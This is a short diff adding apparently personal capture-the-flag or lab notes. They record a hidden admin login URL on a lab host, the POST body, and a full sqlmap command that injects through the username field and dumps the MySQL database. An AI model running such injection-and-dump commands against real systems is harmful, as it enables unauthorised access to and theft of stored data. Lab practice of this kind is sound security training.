@@ -1,0 +1,3 @@
+http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/dologin.php (POST)  # sqlmap.py -u http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/dologin.php --data=username=admin&password=foo -p username --batch --dbms=mysql --dump
+
+username=admin&password=foo
